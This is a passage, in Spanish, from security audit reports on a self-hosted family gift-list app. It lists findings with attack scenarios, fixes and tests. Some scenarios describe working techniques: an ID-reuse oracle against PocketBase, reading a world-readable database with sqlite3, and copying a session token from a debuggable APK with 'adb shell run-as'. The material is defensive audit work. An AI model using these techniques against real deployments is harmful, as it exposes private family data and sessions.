/<([a-z][a-z0-9]*)\b[^>]{0,500}\bitemprop\s*=\s*["']?(pricecurrency|price|name|image)(?=["'\s>])[^>]{0,500}>([^<]{0,200})/gi

function jsonLdProduct(html: string): LdProduct | undefined {
  const lower = html.toLowerCase();
  const open = /<script\b[^>]{0,300}\btype\s*=\s*["']?application\/ld\+json["']?[^>]{0,300}>/gi;
  while (open.exec(html)) {
    const end = lower.indexOf('</script', open.lastIndex);
    if (end === -1) break;
    const body = html.slice(open.lastIndex, end) /* … mismos replace de comentarios, CDATA, «;» y control … */;
    open.lastIndex = end;
    // JSON.parse + findProduct, igual que hoy
  }
  return undefined;
}
```

He probado esta variante en una copia (con topes de 2000 y 1000): los seis ficheros de `test/fixtures/tiendas` dan el mismo resultado que hoy y el peor caso de 1,5 MB baja a 2,7 s (`<meta`), 2,0 s (microdatos) y 10 ms (`<title>` y JSON-LD). Con los topes de arriba debería quedar en torno a la mitad (sin medir).

**Prueba.** En `test/core/meta.test.ts`: para `'<meta '`, `'<a '`, `'<a itemprop '`, `'<title>'` y `'<script type="application/ld+json">'` repetidos hasta 1,5 MB, `parseMeta` termina en menos de 3 s.

### V-19 · Medio · Los avisos dejan en `localStorage` lo que debe otra persona, y de ahí se deduce el gasto de la hucha en la plaza propia

`src/core/avisos.ts:117-135` · `src/ui/Avisos.tsx:22-23, 35`

`seenFacts` guarda `Facts` en `lazo:avisos:<id>`, con `due` en céntimos, y nadie lo borra: no hay cierre de sesión, y cuando el token caduca o se anula (`resume()`), la clave se queda. Hasta la v0.4 `localStorage` no guardaba nada derivado de respuestas (tabla de vías de fuga, fila «`localStorage` del cliente real»).

**Escenario.** Papá usó Lazo en el ordenador del salón; su sesión ya no vale (pulsó «cerrar sesión en todos los dispositivos» desde el móvil). Marta abre su enlace personal en ese navegador y entra con su cuenta. En las herramientas del navegador lee `lazo:avisos:<id de Papá>` → `due`. Lo que debe Papá es la suma de sus partes en todas las plazas menos la suya, **incluida la de Marta**. Marta conoce las demás plazas, resta y obtiene cuánto se ha gastado con la hucha en sus regalos (exacto si Papá aún no ha pagado nada o si Marta es la tesorera). Rompe la regla por deducción. Hace falta navegador compartido: por eso no es alto.

**Arreglo.** Que lo visto muera con la sesión. En `src/core/avisos.ts`, dentro de `seenFacts`:

```ts
  /** Borra lo visto de cualquier otra persona (de todas, si no hay sesión). */
  forget(keep?: Id) {
    try {
      for (const k of Object.keys(localStorage)) if (k.startsWith('lazo:avisos:') && k !== (keep ? KEY(keep) : '')) localStorage.removeItem(k);
    } catch {
      /* sin almacenamiento */
    }
  },
```

y en `src/App.tsx`, al montar y cada vez que cambie `api.me()?.id`: `if (!api.demo) seenFacts.forget(api.me()?.id);` (la demo cambia de persona a propósito y no es frontera). Actualizar la fila de `localStorage` en la tabla de vías de fuga.

**Prueba.** En `test/core/avisos.test.ts`, con un `localStorage` falso: `seenFacts.set('papa', …)`, `seenFacts.forget('marta')` → no queda ninguna clave `lazo:avisos:papa`; `seenFacts.forget()` → no queda ninguna.

### V-20 · Bajo · `flujo.test.mjs` no cubre la regla entera, y la prueba de avisos solo corre contra la demo

`server/test/flujo.test.mjs:43-55, 91` · `test/core/avisos.test.ts` · `SECURITY.md:40`

Lo que sí prueba, y bien: lecturas directas de `claims`, `contributions`, `budgets` y sorpresas de la dueña, que su lista no cambia byte a byte, quién ve cada pago y que las cuentas cuadran. Lo que no:

- `blind()` solo mira listados HTTP. No hay tiempo real, `_via_`, `expand`, entrega (`received`), quitar un regalo reservado (V-1 y V-2) ni sorteo. Eso vive en `rules.test.mjs`; `SECURITY.md` dice «en cada paso… no ve nada de lo suyo».
- `accounts()` no detecta fugas: `core/hucha` ya excluye la plaza propia, así que una fila filtrada no cambia las sumas. Prueba que las cuentas son correctas, no que son secretas.
- `contributions` y `budgets` solo se piden con filtro; `groups`, `lists` y `payments` de la dueña no se comparan antes y después.
- Sin `PB_BIN` la suite se salta y sale en verde.
- `avisos.test.ts` usa `DemoApi`, que ya filtra: el descarte de `buildFacts` no se prueba con filas sin filtrar, ni con lo que entrega el servidor real.

**Escenario.** Una regla nueva deja pasar a la dueña los eventos o un campo de `lists` que cambia al reservar: `flujo.test.mjs` sigue en verde y la documentación lo cita como garantía.

**Arreglo y prueba.** En `flujo.test.mjs`:

```js
const view = async (t) => JSON.stringify(await Promise.all(['groups', 'lists', 'items', 'claims', 'contributions', 'budgets', 'payments', 'draws', 'assignments'].map((c) => get(c, t))));
// paso 4 (todo lo que ocurre es sobre la plaza de Bea): const antes = await view(tok.bea) al empezar; assert.equal(await view(tok.bea), antes) al acabar
// al principio del describe: if (process.env.CI && !BIN) throw new Error('Falta PB_BIN en CI');
```

Compilar también `src/core/avisos.ts` con esbuild y afirmar en el paso 4 que `buildFacts(ids.bea, …)` no cambia. En `avisos.test.ts`, un caso que pase a `buildFacts` filas de la plaza propia (reservas, sorpresas) y espere los mismos `Facts`. Añadir dos pasos (entrega y quitar un regalo reservado) o corregir la frase de `SECURITY.md`.

### V-21 · Bajo · La página enlazada decide el enlace y la tienda que se guardan

`src/core/meta.ts:43, 46` · `src/ui/screens/AddGift.tsx:53`

`og:url` se acepta con cualquier host `https` y `og:site_name` gana a la tienda reconocida por dominio. `AddGift` guarda `meta.url` y `meta.store` sin enseñarlos antes.

**Escenario.** La abuela pega un enlace de una tienda dudosa. La página declara `og:url` a una web de phishing y `og:site_name` «Amazon»: en su lista queda un regalo «Amazon» cuyo botón lleva a la familia a otro sitio.

**Arreglo.** `og:url` solo si es del mismo host que la página, y el dominio conocido primero:

```ts
const og = absHttps(metas.get('og:url'), pageUrl);
let url = og && new URL(og).hostname === new URL(pageUrl).hostname ? og : pageUrl;
const store = knownStore(pageUrl) ?? clean(metas.get('og:site_name')) ?? clean(ld?.seller) ?? hostLabel(pageUrl);
```

**Prueba.** `test/core/meta.test.ts`: página en `https://tienda.example/p` con `og:url` a otro host y `og:site_name` «Amazon» → `url` es la de la página; página en `amazon.es` con `og:site_name` «Otra» → `store` es «Amazon».

### V-22 · Bajo · Los datos vivos y `.env` los lee cualquier usuario del servidor; las copias van sin cifrar

`docs/HOMELAB.md:59-61, 134-139` · `server/backup/lazo-backup.sh:18` · `server/docker-compose.yml:55-66`

Las copias salen con `umask 077` (solo root), pero la guía crea `data/pb` y `.env` con los permisos por defecto: lo normal es 755 y 644, con `data.db` legible por todos (no lo he comprobado en una instalación). `.env` lleva las claves del túnel, de DuckDNS y de `unfurl`. `antes-de-restaurar-*.tar.gz` no entra en la rotación. La guía manda las copias al NAS en claro. El contenedor `backup` es el único sin `no-new-privileges`.

**Escenario.** Otra cuenta de la Raspberry (o un servicio comprometido que comparte máquina con SHIELD-DNS y HEIMDALL) hace `sqlite3 server/data/pb/data.db` y lee reservas, sorteo y datos de los niños sin tocar las copias protegidas.

**Arreglo.** `docs/HOMELAB.md` §2: añadir `chmod 700 data/pb data/backups data/caddy && chmod 600 .env`. `lazo-backup.sh`: rotar también `antes-de-restaurar-*` (`ls -1t "$DST"/antes-de-restaurar-*.tar.gz | tail -n +4 | xargs -r rm -f`). `docker-compose.yml`, servicio `backup`: `security_opt: [no-new-privileges:true]`. En «Fuera de casa», cifrar antes de sacar la copia (`age -r <clave pública>`).

**Prueba.** §7 de la guía: `stat -c '%a' data/pb .env` → `700` y `600`. Prueba de shell del script: tras cinco `restore`, quedan tres `antes-de-restaurar-*`.

### V-23 · Bajo · Cloudflare Tunnel: HTTP en el borde, imagen antigua y `LAZO_BIND` abierto por defecto

`docs/HOMELAB.md:47-51` · `server/docker-compose.yml:47-48, 93` · `server/.env.example:12`

- Con el túnel, Caddy sirve HTTP y el HTTPS lo pone Cloudflare, pero la guía no pide activar «Always Use HTTPS»: si la zona no lo tiene, `http://lazo.tudominio.es` responde en claro y el token viaja sin cifrar.
- `cloudflare/cloudflared:2025.1.0` tiene casi dos años y va sin digest (Caddy sí lo lleva); `alpine:3.22` de `duckdns` y `backup`, igual. Sigue G-12.
- `LAZO_BIND` vale `0.0.0.0` si se olvida: en la opción C, Lazo queda además en HTTP en la LAN.
- El token de DuckDNS va en la línea de órdenes de `wget` (visible con `ps` en el servidor).

**Escenario.** El tío abre `http://lazo.tudominio.es` en la wifi de un bar: su token de 180 días pasa en claro y quien escucha entra como él.

**Arreglo.** Guía, opción C: «SSL/TLS → Edge Certificates → Always Use HTTPS: activado». Fijar `cloudflared` a una versión actual con `@sha256:…`. En `docker-compose.yml`, `${LAZO_BIND:-127.0.0.1}` (quien abre puertos ya pone `0.0.0.0` en su `.env`, como dice la tabla del paso 3).

**Prueba.** §7: `curl -sI http://tu-dominio | head -1` → 301; `docker compose config | grep -c '@sha256'` igual al número de imágenes.

### V-24 · Bajo · Importar: un `.xlsx` comprimido puede colgar la pestaña

`src/ui/screens/Import.tsx:38-47`

El tope es de 5 MB **comprimidos**. Un `.xlsx` de ese tamaño puede inflarse a cientos de MB y SheetJS lo lee entero.

**Escenario.** Alguien manda al grupo «plantilla de regalos.xlsx»; quien la importa se queda con el navegador colgado. No filtra nada y no afecta a los demás.

**Arreglo.** `const opts = { cellDates: false, dense: true, sheetRows: LIMITS.importRows + 1 } as const;`: SheetJS deja de leer filas pasado el límite que la importación ya impone.

**Prueba.** `e2e/importar.spec.ts` o una unitaria: una hoja de 100 000 filas se lee en menos de 2 s y devuelve 301 filas.

### V-25 · Bajo · El mensaje del sorteo no dice de qué sorteo es

`src/ui/screens/Draw.tsx:73-76`

No es una fuga: el mensaje solo lleva lo tuyo. Pero si quien organiza repite el sorteo, el mensaje que te reenviaste sigue diciendo el nombre antiguo y nada lo distingue.

**Escenario.** Papá se envía «te toca regalar a Javier». Se repite el sorteo y ahora le toca Samira. Papá mira su chat, compra para Javier y Samira se queda sin regalo: se descubre que hubo dos sorteos y quién tenía a quién.

**Arreglo.** Pasar `drawRounds` a `shareMessage` y empezar por «Amigo invisible de {grupo} (sorteo n.º {n}): …». El aviso «Han hecho el sorteo» ya salta con cada sorteo nuevo.

**Prueba.** `test/ui/draw.test.ts`: `shareMessage('G', 'Ana', undefined, 2).text` contiene «sorteo n.º 2».

### Orden de trabajo propuesto (v0.5)

1. V-16 (tres líneas de Caddyfile y su prueba).
2. V-17 y V-19.
3. V-18.
4. V-20 y el resto.

### Veredicto

**No se puede publicar** tal como está. V-16 deja el login de superusuario accesible desde Internet, y la documentación dice lo contrario: quien adivine esa contraseña lee todas las listas. El arreglo es pequeño. Con V-16 corregido y probado **se puede publicar**; V-17, V-18 y V-19 deberían ir en la misma versión, y los bajos pueden esperar. En lo nuevo de la v0.5 no he encontrado ninguna vía por la que la dueña de una lista vea o deduzca lo suyo desde su propia sesión: la única deducción (V-19) exige compartir navegador con otro miembro.


### Estado tras la auditoría v0.5 (2026-11-12, Opus 5.5)

- **Corregidos:**
  - V-16: lista blanca de `/api/collections` en `server/Caddyfile`, con su prueba en `server/test/caddyfile.test.mjs`, que corre en CI.
  - V-17: Caddy solo confía en `172.31.253.3/32` (cloudflared en la red `tunel`) y solo lee `CF-Connecting-IP`; PocketBase no es alcanzable desde el túnel. La comprobación está en `docs/HOMELAB.md` §7.
  - V-18: las expresiones de `src/core/meta.ts` van acotadas y el JSON-LD se cierra con `indexOf`. Prueba en `test/core/meta.test.ts`: 1,5 MB de etiquetas sin cerrar se procesan en menos de 3 s.
  - V-19: `seenFacts.forget` borra lo visto de otras personas al cambiar de sesión (salvo en la demo). Prueba en `test/core/avisos.test.ts`.
- **Pendientes (bajos):** V-20 a V-25 quedan anotados en `docs/TAREAS.md` para la v0.6. Ninguno bloquea la publicación.
- **Sin validar en un homelab real:** `caddy validate` y `docker compose up` (en este equipo no hay Docker ni Caddy). Hay que hacerlo en el primer despliegue.

### Estado de los bajos (2026-11-12, Opus 5.5): V-20 a V-25 corregidos

- **V-20:** prueba nueva en `server/test/rules.test.mjs` («V-20: …»): `src/core/avisos.ts` empaquetado con esbuild (como PB-13) calcula los `Facts` de Marta con las mismas consultas que `PocketBaseApi.hucha()` y `drawInfo()`. Con las filas del superusuario (sorpresas y reservas de su plaza incluidas) salen los mismos `Facts` que con su token, y tras sorpresas nuevas, reservas, una compra con la hucha y una reserva en su plaza no cambian ni dan aviso. Comprobado que falla si `buildFacts` deja pasar las sorpresas de la plaza propia. Siguen sin hacer los otros puntos de V-20 sobre `flujo.test.mjs` (`view()` antes y después, `PB_BIN` obligatorio en CI, pasos de entrega y de quitar un regalo reservado).
- **V-21:** `src/core/meta.ts`: `og:url` solo cuenta si es del mismo host que la página, y la tienda reconocida por dominio gana a `og:site_name`. Prueba en `test/core/meta.test.ts`.
- **V-22:** `docs/HOMELAB.md` §2 pide `chmod 700 data/pb data/caddy data/backups` y `chmod 600 .env`, y §7 lo comprueba con `stat`. `server/backup/lazo-backup.sh` cifra las copias con `BACKUP_PASSPHRASE` (`openssl enc -aes-256-cbc -pbkdf2`, `lazo-….tar.gz.enc`), las descifra al restaurar (con una clave mala no borra nada) y rota `antes-de-restaurar-*` (se quedan tres). El contenedor `backup` lleva `no-new-privileges` y `openssl`. Prueba en `server/test/backup.test.mjs` (sh, tar y openssl de verdad; sqlite3 falso).
- **V-23:** la opción C de la guía pide «Always Use HTTPS», y §7 lo comprueba (`curl -sI http://…` → 301). `cloudflared` queda en `2026.10.7@sha256:4955524a…`, y `alpine:3.22` (`duckdns` y `backup`) en `@sha256:49340b34…`, digests comprobados contra el registro de Docker Hub el 2026-11-12. `LAZO_BIND` vale `127.0.0.1` por defecto. Pendiente: el token de DuckDNS sigue en la línea de órdenes de `wget`.
- **V-24:** `src/ui/screens/Import.tsx` lee con `sheetRows: LIMITS.importRows + 1` y, antes de abrir un `.xlsx`/`.ods`, `zipInflatedSize` (`src/core/columns.ts`) suma lo descomprimido que declara el ZIP: más de 50 MB se rechaza. Prueba en `test/ui/import.test.ts`: 100 000 filas se leen en menos de 2 s y dan 301; un ZIP que se infla por encima del tope se rechaza.
- **V-25:** `shareMessage` lleva «(sorteo n.º N)», con el `round` que el hook ya guarda en cada sorteo (`Draw.round`, también en la demo). Prueba en `test/ui/draw.test.ts` y `e2e/sorteo.spec.ts`.

## Auditoría final 1.0 (Fable 5.2)

Fecha: 2026-11-12 · Alcance: todo el producto en `main` (árbol de trabajo sobre `1c5af63`, con cambios sin confirmar solo de texto y estilos en `Printable.tsx`, `Invite.tsx`, `styles.css` y dos E2E). Lo nuevo desde la v0.5 (`git diff 2c7afe5..HEAD`) y, otra vez, las colecciones, `/api/lazo/*`, tiempo real, lotes, enlaces, avisos, `localStorage`, la demo, el APK y los builds.

**Método y límites.**

- **Ejecutado:** las 61 pruebas de `server/test/*.test.mjs` contra PocketBase 0.40.6 en WSL (61/61 en verde). Tres sondas propias contra un PocketBase temporal con las migraciones y los hooks del repo: V-26 y V-29 salen de ahí, y el arreglo de V-26 está probado en una copia temporal de los hooks. `npm audit --omit=dev`: 0 vulnerabilidades.
- **Secretos:** patrones de claves (Google, Anthropic, NVIDIA, Groq, OpenRouter, GitHub, JWT, claves privadas, `UNFURL_KEY`, tokens del túnel y de DuckDNS) sobre los ficheros versionados, todo el historial (`git log --all -p`), `dist`, `dist-demo` y los recursos del APK. Los valores de `.env.local` se han comparado sin imprimirlos: no aparecen en ningún fichero versionado, commit, build ni APK.
- **No ejecutado:** Caddy, Docker, gitleaks (no está instalado aquí; corre en CI), Playwright, vitest ni un navegador. Las capturas PNG no se han revisado a ojo, tampoco las carpetas sin versionar de `docs/design/v1.0/`: conviene mirarlas antes de subirlas. No se ha tocado código.

### Resumen

| Severidad | N.º | Hallazgos |
|---|---|---|
| Crítico | 0 | — |
| Alto | 1 | V-26 |
| Medio | 2 | V-27, V-28 |
| Bajo | 3 | V-29, V-30, V-31 |

### Lo que he comprobado y está bien

- **Tiempo real.** Al quitar un regalo propio, la dueña no recibe ningún evento, esté cogido o libre; los demás reciben `update` (retirado) y, si estaba libre, `delete` (sonda S4). `watch` se suscribe solo a `coleccion/*`, sin opciones. Tras `logout-all`, una conexión de tiempo real ya abierta con el token anulado no recibe nada más (sonda S7).
- **Enlace de solo lectura.** `shared` devuelve nombre, ocasión y regalos sin ids, estado, sorpresas ni retirados: lo mismo que ya ve la dueña. Token de unos 190 bits del que solo se guarda el hash, misma respuesta para falso, rotado y revocado, `no-store`, 30 peticiones por minuto. El token va en el fragmento (`#/ver/…`), así que no viaja en `Referer`. `shares` no se lee por la API ni está en la lista blanca de Caddy. Liberar la plaza borra el enlace.
- **Imprimir.** `PrintScreen` pasa por `toShared`: ningún estado, tampoco al imprimir la lista de otra persona. Enlaces y QR solo `http(s)`.
- **Lotes y hooks.** Los hooks que usan `$app` dentro de un lote (borrar regalo, aportar, crear grupo o plaza) no bloquean la base de datos (sonda S6).
- **Errores idénticos.** Aportar en lo propio (regalo vivo, retirado o inexistente) y poner presupuesto propio (haya o no) dan el mismo 400 (sonda S3). `filter=secret=true`, `removed=true`, `sort=@rowid` y `skipTotal` no enseñan nada oculto a la dueña; `filter=@rowid` se rechaza (sonda S9).
- **Alta y códigos.** `lazo-alta` solo existe como orden de consola. Código de 40 bits, un uso, borrado también si ha caducado, 10 intentos por minuto e IP.
- **`invite-info`.** Las caras son inicial y color, como mucho 12, sin ids ni nombres.
- **`restore`.** Solo en un grupo con un único miembro, solo regalos normales, nunca lee lo que ya hay en una lista.
- **Avisos y `net.ts`.** `seenFacts.forget` se llama al montar y al cambiar de persona, también sin sesión. Solo se reintentan los `GET`; nada se guarda en disco.
- **Enlaces de regalos.** PocketBase acepta `javascript://x@example.com/…` y `ftp://` en `items.url` (sonda S8), pero los tres sitios donde se pinta (`ItemSheet.tsx:151`, `Catalog` y el QR) exigen `http(s)`, React 19 bloquea `javascript:` y la CSP no admite scripts en línea.
- **Builds.** `dist` y `dist-demo` sin mapas de fuentes, sin correos ni direcciones privadas; `__lazoDemo` solo en la demo. Las claves de `.env.local` no llevan prefijo `VITE_`, así que Vite no las incrusta. `.dockerignore` deja fuera `.env*` y `server/data`.
- **Homelab.** `Referrer-Policy: no-referrer`, lista blanca de colecciones, Caddy confía solo en la IP de cloudflared, PocketBase en `127.0.0.1`, imágenes de Caddy, cloudflared y Alpine con digest. Copias cifradas con la clave por variable de entorno, no en la línea de órdenes.

### V-26 · Alto · Crear un regalo con el id de uno que quitaste dice si estaba cogido

`server/pb/pb_hooks/lazo.pb.js:105-128` · `server/pb/pb_migrations/1762860000_plazas_hucha.js:53` · `1762850000_lazo.js:215` (lotes)

Quitar un regalo propio responde siempre 204, pero si tenía reservas, compras o aportaciones la fila sigue existiendo, oculta («retirado»). PocketBase deja que el cliente elija el `id` al crear, y la unicidad del id se valida sin mirar reglas. La dueña conoce el id de su regalo.

**Comprobado** en PocketBase 0.40.6 (sonda S1 y S2), con Marta como dueña:

| Petición de Marta | Regalo que estaba cogido | Regalo que estaba libre |
|---|---|---|
| `DELETE items/records/ID` | 204 | 204 |
| `POST items/records` con `"id":"ID"` | **400** `validation_not_unique` | **200** |
| `POST /api/batch` con `PUT items/records` e `"id":"ID"` | **400** (dentro, 404) | **200** |

**Escenario.** Marta quiere saber si ya le han cogido la bicicleta. La quita de su lista y la vuelve a crear con el mismo id. Si responde 200, estaba libre, y el regalo queda como estaba, con el mismo id. Si responde 400, alguien la tenía reservada o comprada. Vale para cualquier regalo suyo, uno a uno, y también meses después para regalos que quitó en su día. Es la misma fuga que V-1 y V-2 por otra puerta.

**Arreglo.** Nadie salvo el superusuario elige ids, y los lotes solo crean (el cliente no usa otra cosa: `importItems`). En `lazo.pb.js`, junto al cortafuegos:

```js
// V-26: un id elegido por el cliente delata si una fila oculta (un regalo retirado) sigue existiendo.
onRecordCreateRequest((e) => {
  if (!(e.auth && e.auth.isSuperuser()) && e.requestInfo().body.id) throw new BadRequestError('Failed to create record.');
  e.next();
});
// El upsert de los lotes (PUT) hace la misma pregunta: 404 si existe oculto, 200 si no.
onBatchRequest((e) => {
  if (!(e.auth && e.auth.isSuperuser()) && e.batch.some((r) => String(r.method).toUpperCase() !== 'POST')) throw new ForbiddenError('Consulta no permitida.');
  e.next();
});
```

**Probado** en una copia temporal de los hooks: los dos `POST` dan el mismo 400 con el mismo cuerpo, los dos `PUT` el mismo 403, y los lotes de `POST` sin id (importar, aportar, crear grupo) siguen funcionando. PB-14 usa `PATCH` dentro de un lote: hay que cambiar lo que espera a 403.

**Prueba.** Ampliar PB-10 en `server/test/rules.test.mjs`: tras quitar un regalo cogido y uno libre, `POST items/records` con cada id y el lote con `PUT` devuelven estado y cuerpo idénticos en los dos casos. Hoy falla.

### V-27 · Medio · La copia del grupo deja en un archivo las reservas, compras, sorpresas y presupuestos de los demás

`src/core/copia.ts:31-34, 77-91` · `src/ui/screens/Settings.tsx:148` · `test/core/copia.test.ts:86-94`

`exportGroup` recorta la plaza de quien descarga, pero de las demás guarda `reservas` (quién, estado, cuánto pagó), `aportaciones`, `sorpresas`, `retirados` y `presupuestoCents`. Al restaurar no se usa nada de eso: `parseCopia` solo lee `regalos`. Es un archivo JSON en claro, con nombre `lazo-<grupo>-<fecha>.json`, en la carpeta de descargas.

**Escenario.** Papá organiza y descarga la copia en el ordenador de casa, o se la manda a Marta «para que la guarde». Marta abre el archivo y lee sus sorpresas, quién le ha comprado qué, por cuánto y su presupuesto. No hacen falta herramientas ni sesión, y el archivo no caduca. Es la vía de V-19 (navegador compartido), más fácil y portátil. La copia lleva además el año de nacimiento de los niños.

**Arreglo.** La copia lleva solo lo que se restaura: los regalos pedidos de cada lista. En `copia.ts`, borrar `GiftSeen`, `propia`, `sorpresas`, `retirados` y `presupuestoCents`, y dejar una sola rama:

```ts
for (const l of d.lists) {
  const x = await api.listDetail(l.id);
  listas.push({ name: l.name, kind: l.kind ?? (l.user ? 'person' : 'child'), ...(l.birthYear ? { birthYear: l.birthYear } : {}), regalos: x.items.filter((i) => !i.secret && !i.removed).map(strip) });
}
```

En `Settings.tsx:148`: «La copia lleva solo los regalos que pidió cada persona: nada de reservas, compras, sorpresas ni presupuestos.» Así el archivo no contiene nada que su dueño no sepa ya, lo descargue quien lo descargue.

**Prueba.** En `test/core/copia.test.ts`, sustituir el caso «de las listas ajenas sí lleva…» por: `JSON.stringify(copia.listas)` es idéntico para todas las personas del grupo, y la copia entera no casa `/reservas|aportaciones|sorpresas|retirados|presupuesto/` ni contiene el título de la sorpresa. La misma expresión sobre el archivo completo en `e2e/copia.spec.ts`.

### V-28 · Medio · No se puede cerrar sesión, ni en este dispositivo ni en todos

`src/api/pocketbase.ts:38-40` · `src/ui/screens/Settings.tsx` · `SECURITY.md:64`

El único `authStore.clear()` es el de `resume()` cuando el token ya no vale. No hay botón de salir, y `/api/lazo/logout-all` existe en el servidor pero nada del cliente lo llama, aunque `SECURITY.md` lo cita como medida. La sesión dura 180 días y se renueva sola.

**Escenario 1.** Papá entra con un código en la tableta del salón para apuntar regalos. No puede salir. Marta abre Lazo en la tableta, es Papá, y ve quién ha reservado qué en su lista.

**Escenario 2.** Roban o se pierde el móvil de quien organiza. Su plaza no se puede liberar (`plaza-release` excluye al dueño) y él no tiene desde dónde anular la sesión: quien tenga el móvil sigue dentro, como admin, hasta que alguien entre al servidor como superusuario.

**Arreglo.** En `Api`, `signOut(everywhere: boolean)`. En `pocketbase.ts`:

```ts
signOut = (everywhere: boolean) =>
  this.run(async () => {
    if (everywhere) await this.pb.send('/api/lazo/logout-all', { method: 'POST' }); // el token nuevo no se guarda
    this.pb.authStore.clear();
    try {
      for (const k of Object.keys(localStorage)) if (/^lazo:(avisos|pendiente):|^lazo:last-group$/.test(k)) localStorage.removeItem(k);
    } catch {
      /* sin almacenamiento */
    }
  });
```

En la demo, no hace nada. En `Settings.tsx`, un bloque «Sesión» con «Salir en este dispositivo» y «Salir en todos los dispositivos», con el aviso «Para volver a entrar necesitarás un código desde otro móvil o un enlace nuevo de quien organiza», y después `location.hash = '/'` y recargar.

**Prueba.** `server/test/rules.test.mjs`: tras `logout-all`, el token viejo no lista nada y `auth-refresh` da 401; el devuelto sí vale (hoy no hay ninguna prueba de este endpoint). Unitaria: tras `signOut(false)`, `api.me()` es nulo y no queda `pocketbase_auth` ni ninguna clave `lazo:avisos:` en `localStorage`.

### V-29 · Bajo · `restore` no tiene límite de peticiones

`server/pb/pb_hooks/lazo.pb.js:786-850` · `server/pb/pb_migrations/1762880000_compartir.js:26-30`

Cualquier cuenta puede crear un grupo (`groups.createRule` solo pide sesión), y en un grupo recién creado es admin y único miembro. También una cuenta pendiente que solo tiene el enlace general.

**Medido** (sonda S5): 25 llamadas seguidas con 600 regalos cada una crean 15 000 filas en 3 s, y la reserva de otra persona lanzada mientras tanto tarda 1,6 s en vez de 4 ms. No filtra nada.

**Escenario.** Alguien con un enlace general reenviado deja un bucle llamando a `restore`: las reservas de la familia se atascan y el disco de la Raspberry se llena; con el disco lleno fallan también las copias.

**Arreglo.** Migración nueva (`1762890000_limite_restore.js`) que añade a `rateLimits.rules`: `{ label: 'POST /api/lazo/restore', maxRequests: 3, duration: 60, audience: '@auth' }`. Restaurar una copia es una sola llamada.

**Prueba.** `server/test/copia.test.mjs`: la cuarta llamada en un minuto responde 429.

### V-30 · Bajo · El único APK que sabe hacer el repo es de depuración

`scripts/build-apk.sh:18` · `android/app/build.gradle:10-11, 19-24`

El script solo lanza `assembleDebug`. He abierto el `app-debug.apk` local: su manifiesto lleva `debuggable`, y va firmado con la clave de depuración de la máquina. `build.gradle` no tiene configuración de firma de `release` y sigue en `versionName "0.5.1"`. El script comprueba `webContentsDebuggingEnabled` y `allowBackup`, no `debuggable`.

**Escenario.** Se publica ese APK como 1.0. En un móvil con depuración USB activa, quien lo conecte a un ordenador ejecuta `adb shell run-as com.bertmarti.lazo` y copia el `localStorage` con el token de 180 días. Y si la clave de depuración se pierde, nadie puede actualizar la app sin desinstalarla.

**Arreglo.** En `build-apk.sh`, modo `release`: `./gradlew assembleRelease` con `signingConfigs.release` leído de un fichero fuera del repo (ruta en `LAZO_KEYSTORE_PROPS`), y antes de dar el APK por bueno:

```bash
"$ANDROID_HOME"/build-tools/*/aapt2 dump badging "$APK" | grep -q 'application-debuggable' && { echo "¡APK depurable!" >&2; exit 1; }
"$ANDROID_HOME"/build-tools/*/apksigner verify --print-certs "$APK"
```

Subir `versionCode` y `versionName` a la 1.0.0. Añadir `keystore.properties` a `.gitignore` (`*.jks` y `*.keystore` ya están). Publicar solo `app-release.apk`.

**Prueba.** La comprobación de arriba dentro del script, y en la lista de la release: `aapt2 dump badging lazo-1.0.0.apk | grep -c debuggable` → 0.

### V-31 · Bajo · `SECURITY.md` no cuenta lo nuevo y promete algo que no está

`SECURITY.md:16, 64`

- Dice que la única excepción a «el servidor solo entrega filas» es la entrega. Ahora también salen datos del grupo sin sesión por `shared/{token}` e `invite-info` (caras), y existe la copia del grupo. Ninguno aparece.
- «Cerrar sesión en todos los dispositivos» figura como medida y no tiene botón (V-28).
- No dice que quien administra el servidor (superusuario, `data.db`, copias) lo lee todo, también su propia lista. Es inherente a alojarlo en casa, y debe estar escrito junto al riesgo R1.

**Arreglo.** Añadir a la tabla «Otras medidas» las filas del enlace de solo lectura (qué lleva, hash, rotación, revocación), de la copia del grupo (tras V-27: solo regalos pedidos) y del tiempo real (solo `coleccion/*`, regla por evento); y un párrafo «Quien aloja el servidor» en riesgos declarados.

**Prueba.** Revisión del texto en la PR de la 1.0.

### Vías de fuga y su estado

| Vía | Estado | Por qué |
|---|---|---|
| Lectura directa de `claims`, `contributions`, `budgets` (lista, id, `totalItems`, `fields`, `skipTotal`) | Cubierta | Reglas `SEE_ITEM` y `SEE_LIST`; 61/61 y sonda S9 |
| `expand`, `filter` y `sort` por `_via_` o `@collection` | Cubierta | Cortafuegos y regla de la colección de destino |
| Sorpresas y retirados de la propia plaza | Cubierta | Regla `VIS`; `filter=secret=true` devuelve 0 a la dueña |
| Tiempo real con opciones en el topic | Cubierta | Lista blanca de topics (R-1) |
| Tiempo real, eventos de la propia plaza | Cubierta | Regla por evento; al quitar un regalo la dueña no recibe nada (S4) |
| Tiempo real con la sesión anulada | Cubierta | La conexión abierta deja de recibir (S7) |
| Quitar un regalo propio: código de respuesta | Cubierta | Siempre 204 (PB-10) |
| **Quitar un regalo propio y reutilizar su id** | **NO cubierta → V-26** | 400 si estaba cogido, 200 si no |
| **Lotes: upsert (`PUT`)** | **NO cubierta → V-26** | 404 dentro del lote si la fila oculta existe |
| Lotes: `expand` y `_via_` | Cubierta | PB-14 |
| `gift` sobre lo propio, retirado o inexistente | Cubierta | 403 o 404 antes de leer estado (V-1) |
| Aportar o poner presupuesto en lo propio | Cubierta | Mismo 400 exista o no (S3) |
| Agregados y recuentos | Cubierta | No hay ninguno que dependa de filas ocultas: `invite-info` cuenta personas, `shared` regalos visibles, `restore` lo que envías |
| Hucha: tu parte, pagos, saldos | Cubierta | Tu parte depende solo de plazas ajenas; los pagos solo los ven sus dos partes (PB-12, PB-13) |
| Entrega (`received`) | Según diseño | Dos llaves; solo lo comprado antes de abrir, sin precios |
| Enlace de solo lectura | Cubierta | Sin estado, sorpresas, retirados ni ids; hash, rotación y revocación |
| Vista para imprimir | Cubierta | `toShared`, sin estado |
| Enlaces de invitación y códigos | Cubierta | Hash, un uso, caducidad, límite; token en el fragmento |
| Recuperar la plaza (`plaza-release`) | Riesgo declarado R1 | Quien organiza puede liberar una plaza y ocuparla desde otro navegador. Cada entrada da el aviso «X ha entrado en el grupo» a los demás. Ver V-31 |
| **Copia del grupo (archivo)** | **NO cubierta → V-27** | Lleva estados, sorpresas y presupuestos ajenos en claro |
| `restore` | Cubierta | No lee listas; sin límite de peticiones (V-29, disponibilidad) |
